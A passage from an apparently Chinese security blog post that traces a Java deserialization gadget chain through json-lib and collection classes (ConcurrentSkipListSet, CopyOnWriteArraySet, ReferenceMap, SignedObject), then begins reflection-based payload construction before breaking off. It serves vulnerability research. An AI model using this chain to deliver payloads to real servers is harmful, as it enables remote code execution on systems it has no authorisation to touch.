<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONObject <span class="hljs-title function_">fromObject</span><span class="hljs-params">(Object object, JsonConfig jsonConfig)</span> &#123;<br>    <span class="hljs-keyword">if</span> (object != <span class="hljs-literal">null</span> &amp;&amp; !JSONUtils.isNull(object)) &#123;<br>        <span class="hljs-keyword">if</span> (object <span class="hljs-keyword">instanceof</span> Enum) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;&#x27;object&#x27; is an Enum. Use JSONArray instead&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!(object <span class="hljs-keyword">instanceof</span> Annotation) &amp;&amp; !object.getClass().isAnnotation()) &#123;<br>            <span class="hljs-keyword">if</span> (object <span class="hljs-keyword">instanceof</span> JSONObject) &#123;<br>                <span class="hljs-keyword">return</span> _fromJSONObject((JSONObject)object, jsonConfig);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (object <span class="hljs-keyword">instanceof</span> DynaBean) &#123;<br>                <span class="hljs-keyword">return</span> _fromDynaBean((DynaBean)object, jsonConfig);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (object <span class="hljs-keyword">instanceof</span> JSONTokener) &#123;<br>                <span class="hljs-keyword">return</span> _fromJSONTokener((JSONTokener)object, jsonConfig);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (object <span class="hljs-keyword">instanceof</span> JSONString) &#123;<br>                <span class="hljs-keyword">return</span> _fromJSONString((JSONString)object, jsonConfig);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (object <span class="hljs-keyword">instanceof</span> Map) &#123;<br>                <span class="hljs-keyword">return</span> _fromMap((Map)object, jsonConfig);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (object <span class="hljs-keyword">instanceof</span> String) &#123;<br>                <span class="hljs-keyword">return</span> _fromString((String)object, jsonConfig);<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!JSONUtils.isNumber(object) &amp;&amp; !JSONUtils.isBoolean(object) &amp;&amp; !JSONUtils.isString(object)) &#123;<br>                <span class="hljs-keyword">if</span> (JSONUtils.isArray(object)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;&#x27;object&#x27; is an array. Use JSONArray instead&quot;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">return</span> _fromBean(object, jsonConfig);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;&#x27;object&#x27; is an Annotation.&quot;</span>);<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(<span class="hljs-literal">true</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>fromObject 会判断 Object 的类型并做相应处理，SignedObject 类最后会进入 _fromBean 函数。继续往上：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">_processValue</span><span class="hljs-params">(Object value, JsonConfig jsonConfig)</span> &#123;<br>    <span class="hljs-keyword">if</span> (JSONNull.getInstance().equals(value)) &#123;<br>        <span class="hljs-keyword">return</span> JSONNull.getInstance();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!Class.class.isAssignableFrom(value.getClass()) &amp;&amp; !(value <span class="hljs-keyword">instanceof</span> Class)) &#123;<br>        <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> JSONFunction) &#123;<br>            <span class="hljs-keyword">return</span> value;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> JSONString) &#123;<br>            <span class="hljs-keyword">return</span> JSONSerializer.toJSON((JSONString)value, jsonConfig);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> JSON) &#123;<br>            <span class="hljs-keyword">return</span> JSONSerializer.toJSON(value, jsonConfig);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (JSONUtils.isArray(value)) &#123;<br>            <span class="hljs-keyword">return</span> JSONArray.fromObject(value, jsonConfig);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (JSONUtils.isString(value)) &#123;<br>            <span class="hljs-keyword">return</span> value.toString();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (JSONUtils.isNumber(value)) &#123;<br>            JSONUtils.testValidity(value);<br>            <span class="hljs-keyword">return</span> JSONUtils.transformNumber((Number)value);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (JSONUtils.isBoolean(value)) &#123;<br>            <span class="hljs-keyword">return</span> value;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> JSONObject.fromObject(value, jsonConfig);<br>            <span class="hljs-keyword">return</span> jsonObject.isNullObject() ? JSONNull.getInstance() : jsonObject;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> ((Class)value).getName();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>AbstractJSON 类的 _processValue 函数，再往上：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> JSONArray <span class="hljs-title function_">addValue</span><span class="hljs-params">(Object value, JsonConfig jsonConfig)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>._addValue(<span class="hljs-built_in">this</span>.processValue(value, jsonConfig), jsonConfig);<br>&#125;<br><br><span class="hljs-keyword">private</span> Object <span class="hljs-title function_">processValue</span><span class="hljs-params">(Object value, JsonConfig jsonConfig)</span> &#123;<br>    <span class="hljs-keyword">if</span> (value != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">JsonValueProcessor</span> <span class="hljs-variable">jsonValueProcessor</span> <span class="hljs-operator">=</span> jsonConfig.findJsonValueProcessor(value.getClass());<br>        <span class="hljs-keyword">if</span> (jsonValueProcessor != <span class="hljs-literal">null</span>) &#123;<br>            value = jsonValueProcessor.processArrayValue(value, jsonConfig);<br>            <span class="hljs-keyword">if</span> (!JsonVerifier.isValidJsonValue(value)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;Value is not a valid JSON value. &quot;</span> + value);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>._processValue(value, jsonConfig);<br>&#125;<br><br><span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">_processValue</span><span class="hljs-params">(Object value, JsonConfig jsonConfig)</span> &#123;<br>    <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> JSONTokener) &#123;<br>        <span class="hljs-keyword">return</span> _fromJSONTokener((JSONTokener)value, jsonConfig);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value != <span class="hljs-literal">null</span> &amp;&amp; Enum.class.isAssignableFrom(value.getClass())) &#123;<br>        <span class="hljs-keyword">return</span> ((Enum)value).name();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!(value <span class="hljs-keyword">instanceof</span> Annotation) &amp;&amp; (value == <span class="hljs-literal">null</span> || !value.getClass().isAnnotation())) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>._processValue(value, jsonConfig);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;Unsupported type&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>JSONArray 类，它继承了 AbstractJSON 类，其 addValue 函数最后会调用父类 AbstractJSON 的 _processValue 函数，继续往上，其 _fromCollection 函数中：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><span class="hljs-type">Iterator</span> <span class="hljs-variable">elements</span> <span class="hljs-operator">=</span> collection.iterator();<br><br><span class="hljs-keyword">while</span>(elements.hasNext()) &#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">element</span> <span class="hljs-operator">=</span> elements.next();<br>    jsonArray.addValue(element, jsonConfig);<br>    fireElementAddedEvent(i, jsonArray.get(i++), jsonConfig);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>遍历第一个参数 collection，然后调用 addValue。再往上，其 fromObject 函数中：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> JSONArray <span class="hljs-title function_">fromObject</span><span class="hljs-params">(Object object, JsonConfig jsonConfig)</span> &#123;<br>    <span class="hljs-keyword">if</span> (object <span class="hljs-keyword">instanceof</span> JSONString) &#123;<br>        <span class="hljs-keyword">return</span> _fromJSONString((JSONString)object, jsonConfig);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (object <span class="hljs-keyword">instanceof</span> JSONArray) &#123;<br>        <span class="hljs-keyword">return</span> _fromJSONArray((JSONArray)object, jsonConfig);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (object <span class="hljs-keyword">instanceof</span> Collection) &#123;<br>        <span class="hljs-keyword">return</span> _fromCollection((Collection)object, jsonConfig);<br>    &#125; <br>    ...<br>&#125;<br></code></pre></td></tr></table></figure>

<p>如果参数 Object 为 Collection 类型，就会调用 _fromCollection。再往上：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">containsAll</span><span class="hljs-params">(Collection collection)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.containsAll(collection, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JsonConfig</span>());<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">containsAll</span><span class="hljs-params">(Collection collection, JsonConfig jsonConfig)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.elements.containsAll(fromObject(collection, jsonConfig));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>containsAll 是 List&#x2F;Collection 接口里面的函数，后面的链就好找多了。</p>
<p>ConcurrentSkipListSet 类的 equals 函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>    <span class="hljs-comment">// Override AbstractSet version to avoid calling size()</span><br>    <span class="hljs-keyword">if</span> (o == <span class="hljs-built_in">this</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">if</span> (!(o <span class="hljs-keyword">instanceof</span> Set))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    Collection&lt;?&gt; c = (Collection&lt;?&gt;) o;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> containsAll(c) &amp;&amp; c.containsAll(<span class="hljs-built_in">this</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassCastException unused) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (NullPointerException unused) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里调用了 c.containsAll，可以用来连接 containsAll，但是有个要求，c 必须是 Set 类型的对象，所以还需要找到一个 containsAll 函数返回值可控的 Set 类，这里找到 ListOrderedSet 类，其 containsAll 函数来自父类 AbstractCollectionDecorator：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">containsAll</span><span class="hljs-params">(Collection coll)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.collection.containsAll(coll);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>至于怎么连接 equals，方法挺多的，最常见的办法就是利用 Map，不过一般情况下都需要一致的 hashCode 才能触发，而 ConcurrentSkipListSet 的 hashCode 计算起来比较复杂，所以再周转一下，找到 CopyOnWriteArraySet 类：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>    <span class="hljs-keyword">if</span> (o == <span class="hljs-built_in">this</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">if</span> (!(o <span class="hljs-keyword">instanceof</span> Set))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    Set&lt;?&gt; set = (Set&lt;?&gt;)(o);<br>    Iterator&lt;?&gt; it = set.iterator();<br><br>    <span class="hljs-comment">// Uses O(n^2) algorithm that is only appropriate</span><br>    <span class="hljs-comment">// for small sets, which CopyOnWriteArraySets should be.</span><br><br>    <span class="hljs-comment">//  Use a single snapshot of underlying array</span><br>    Object[] elements = al.getArray();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> elements.length;<br>    <span class="hljs-comment">// Mark matched elements to avoid re-checking</span><br>    <span class="hljs-type">boolean</span>[] matched = <span class="hljs-keyword">new</span> <span class="hljs-title class_">boolean</span>[len];<br>    <span class="hljs-type">int</span> <span class="hljs-variable">k</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    outer: <span class="hljs-keyword">while</span> (it.hasNext()) &#123;<br>        <span class="hljs-keyword">if</span> (++k &gt; len)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> it.next();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; len; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (!matched[i] &amp;&amp; eq(x, elements[i])) &#123;<br>                matched[i] = <span class="hljs-literal">true</span>;<br>                <span class="hljs-keyword">continue</span> outer;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> k == len;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">eq</span><span class="hljs-params">(Object o1, Object o2)</span> &#123;<br>    <span class="hljs-keyword">return</span> (o1 == <span class="hljs-literal">null</span>) ? o2 == <span class="hljs-literal">null</span> : o1.equals(o2);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>遍历参数 o，然后依次跟自身属性 al 中的元素调用 eq 作比较。而其 hashCode 函数如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>    Iterator&lt;E&gt; i = iterator();<br>    <span class="hljs-keyword">while</span> (i.hasNext()) &#123;<br>        <span class="hljs-type">E</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> i.next();<br>        <span class="hljs-keyword">if</span> (obj != <span class="hljs-literal">null</span>)<br>            h += obj.hashCode();<br>    &#125;<br>    <span class="hljs-keyword">return</span> h;<br>&#125;<br><br><span class="hljs-keyword">public</span> Iterator&lt;E&gt; <span class="hljs-title function_">iterator</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> al.iterator();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到，其 hashCode 同样来自属性 al，所以我们可以使用两个元素相同顺序不同的 CopyOnWriteArraySet，里面存放 ConcurrentSkipListSet 和 ListOrderedSet 对象，这样就可以以 ListOrderedSet 为参数触发 ConcurrentSkipListSet 的 equals 函数了。</p>
<p>能触发 equals 的 map，payload 中采用的是 ReferenceMap，其 readObject 如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    in.defaultReadObject();<br>    <span class="hljs-built_in">this</span>.doReadObject(in);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>doReadObject 来自父类 AbstractReferenceMap：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doReadObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-built_in">this</span>.keyType = in.readInt();<br>    <span class="hljs-built_in">this</span>.valueType = in.readInt();<br>    <span class="hljs-built_in">this</span>.purgeValues = in.readBoolean();<br>    <span class="hljs-built_in">this</span>.loadFactor = in.readFloat();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">capacity</span> <span class="hljs-operator">=</span> in.readInt();<br>    <span class="hljs-built_in">this</span>.init();<br>    <span class="hljs-built_in">this</span>.data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashEntry</span>[capacity];<br><br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> in.readObject();<br>        <span class="hljs-keyword">if</span> (key == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-built_in">this</span>.threshold = <span class="hljs-built_in">this</span>.calculateThreshold(<span class="hljs-built_in">this</span>.data.length, <span class="hljs-built_in">this</span>.loadFactor);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> in.readObject();<br>        <span class="hljs-built_in">this</span>.put(key, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>然后是 put：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">put</span><span class="hljs-params">(Object key, Object value)</span> &#123;<br>    <span class="hljs-keyword">if</span> (key == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>(<span class="hljs-string">&quot;null keys not allowed&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>(<span class="hljs-string">&quot;null values not allowed&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">this</span>.purgeBeforeWrite();<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.put(key, value);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">put</span><span class="hljs-params">(Object key, Object value)</span> &#123;<br>    key = <span class="hljs-built_in">this</span>.convertKey(key);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.hash(key);<br>    <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.hashIndex(hashCode, <span class="hljs-built_in">this</span>.data.length);<br><br>    <span class="hljs-keyword">for</span>(AbstractHashedMap.<span class="hljs-type">HashEntry</span> <span class="hljs-variable">entry</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.data[index]; entry != <span class="hljs-literal">null</span>; entry = entry.next) &#123;<br>        <span class="hljs-keyword">if</span> (entry.hashCode == hashCode &amp;&amp; <span class="hljs-built_in">this</span>.isEqualKey(key, entry.key)) &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">oldValue</span> <span class="hljs-operator">=</span> entry.getValue();<br>            <span class="hljs-built_in">this</span>.updateEntry(entry, value);<br>            <span class="hljs-keyword">return</span> oldValue;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">this</span>.addMapping(index, hashCode, key, value);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isEqualKey</span><span class="hljs-params">(Object key1, Object key2)</span> &#123;<br>    key2 = <span class="hljs-built_in">this</span>.keyType &gt; <span class="hljs-number">0</span> ? ((Reference)key2).get() : key2;<br>    <span class="hljs-keyword">return</span> key1 == key2 || key1.equals(key2);<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>观察参考文章的 payload，可以发现其是通过 HTTP 方式触发的，还用到了两个奇怪的类，通过 writeReplace 进行序列化，可能是为了避免生成对象的过程中触发某些奇特操作，还是用反射的方式写吧。</p>
<p>首先生成序列化数据测试一下先：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> (SignedObject)createWithoutConstructor(<span class="hljs-string">&quot;java.security.SignedObject&quot;</span>);<br>setField(signedObject, <span class="hljs-string">&quot;content&quot;</span>, getPOC());<br>setField(signedObject, <span 